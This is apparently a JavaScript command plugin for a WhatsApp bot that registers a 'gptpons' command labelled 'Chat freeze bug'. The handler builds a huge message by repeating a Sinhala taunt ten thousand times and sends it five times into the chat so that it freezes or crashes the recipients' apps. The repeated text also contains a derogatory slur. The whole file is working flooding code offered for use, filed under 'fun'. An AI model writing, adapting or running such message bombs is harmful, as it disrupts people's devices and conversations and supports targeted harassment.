const { cmd } = require('../command');

cmd({
    pattern: "gptpons",
    alias: ["gptp"],
    react: "🍑",
    desc: "Chat freeze bug 😈",
    category: "fun",
    filename: __filename
},
async (robin, mek, m, { from, reply }) => {
    try {
        // Character count eka poddak adu kara (Safety ekata)
        // Ethakota bot crash wenne nathuwa message eka yanawa.
        let heavyText = "```GLITCH PHANTOMS THAMA HUTTO PONNAYO INNE👻```\n" +
                         "*\"GLITCH PHANTOMS නම් පොන්නයො තමයි..🫃\"*\n\n".repeat(10000); 

        let bugMessage = "```GLITCH PHANTOMS THAMA HUTTO 👻```\n" +
                         "*\"අපිත් එක්ක හැප්පෙන්න උබලා මොන පොන්නයොද බන්\"*\n\n" + 
                         heavyText;

        // Loop eka athule await pawichchi karaddi error ekak awoth bot nawathina nisa try-catch damma
        for (let i = 0; i < 5; i++) {
            await robin.sendMessage(from, {
                text: bugMessage
            }, { quoted: m });
        }

    } catch (e) {
        console.log(e);
        reply("An error occurred while sending the message.");
    }
});
